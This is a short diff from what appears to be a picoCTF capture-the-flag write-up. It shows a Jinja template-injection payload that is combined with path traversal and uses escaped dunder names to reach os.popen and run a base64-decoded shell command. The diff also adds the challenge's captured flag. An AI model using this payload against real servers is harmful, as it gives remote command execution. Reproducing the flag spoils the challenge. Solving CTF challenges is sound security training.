@@ -43,5 +43,5 @@
 
     - Face to jinja, find payload RCE on hacktricks:  ..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\aa{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHM | base64 -d | bash")["read"]() %}{{a}}{% endwith %}
 
-      -> Try this for RCE, open file from errors parameter and keep going...
+      -> Try this for RCE, open file from errors parameter and keep going... for this: picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
 
